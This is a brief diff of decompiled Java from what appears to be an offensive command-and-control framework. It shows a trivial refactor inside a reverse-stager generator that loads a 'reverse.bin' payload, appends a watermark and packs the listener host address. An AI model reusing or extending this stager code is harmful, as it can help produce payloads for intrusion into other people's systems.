@@ -19,7 +19,8 @@ public class ForeignReverseStagerX86 extends GenericStager {
    }
 
    public byte[] generate() {
-      String var1 = CommonUtils.bString(CommonUtils.readResource("resources/reverse.bin")) + this.getConfig().getWatermark();
+      String var10000 = CommonUtils.bString(CommonUtils.readResource("resources/reverse.bin"));
+      String var1 = var10000 + this.getConfig().getWatermark();
       long var2 = Route.ipToLong(this.getListener().getStagerHost());
       Packer var4 = new Packer();
       var4.addInt((int)var2);
